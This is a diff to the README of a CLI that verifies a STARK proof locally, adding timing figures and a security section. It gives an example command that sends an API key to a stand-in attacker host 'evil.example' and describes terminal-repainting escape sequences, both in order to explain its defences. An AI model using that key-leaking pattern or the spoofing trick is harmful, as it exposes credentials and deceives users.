@@ -6,9 +6,13 @@
 npx @hyperdag/trust-demo
 ```
 
-In about a second you will watch a genuine Plonky3 STARK proof verify **on your own
-machine**, and then watch the same verifier reject three tampered versions of it. Then the
-command reads four live production surfaces over keyless HTTP.
+You will watch a genuine Plonky3 STARK proof verify **on your own machine**, and then watch
+the same verifier reject three tampered versions of it. Then the command reads four live
+production surfaces over keyless HTTP.
+
+Measured **~65 ms** wall clock for all four verifications, including Node startup, on an
+x86_64 container (5 runs: 62–70 ms). Your machine will differ; the point is that it is
+fast enough that there is no reason not to check.
 
 ## Why the first step is the important one
 
@@ -77,7 +81,31 @@ vendored here (it would drift silently); for that number with its ruler attached
 --engine <url>      point at a different deployment
 --json              machine-readable output, same data
 --timeout <ms>      per-request timeout (default 15000)
+--send-key-to-custom-engine
+                    allow REPID_API_KEY to be sent to a non-official --engine
 ```
+
+## Security properties
+
+This is a tool whose entire claim is "believe your own machine". Two things follow, and
+both are enforced by tests rather than intention.
+
+**The server cannot draw on your terminal.** Every value that comes off the network is
+stripped of ANSI escape sequences and control characters before it is printed, and bounded
+in length. Without that, a hostile or compromised engine could return cursor-movement
+sequences that erase a red `FAIL` the client had already printed and repaint it as a green
+`OK` — defeating the whole argument invisibly, while the cryptography stayed correct. If an
+engine tries it, the run says so explicitly rather than quietly cleaning up after it.
+
+**Your API key goes to the official engine and nowhere else.** `--engine` retargets the
+CLI, so `REPID_API_KEY=… npx @hyperdag/trust-demo --engine https://evil.example` would
+otherwise hand your key to a stranger. The token is only sent to the official origin unless
+you pass `--send-key-to-custom-engine` for a host that is genuinely yours; otherwise it is
+withheld and the run tells you it was withheld. Comparison is on URL origin, not a prefix —
+`…up.railway.app.evil.com` does not pass.
+
+Beyond that: the package writes no files, executes nothing it downloads, and has exactly
+one dependency (pure WASM, no transitive dependencies, `npm audit` clean).
 
 Exit codes: `0` every attempted leg passed · `1` a leg that ran produced a failure (for
 example a proof was rejected) · `2` nothing could be checked at all.
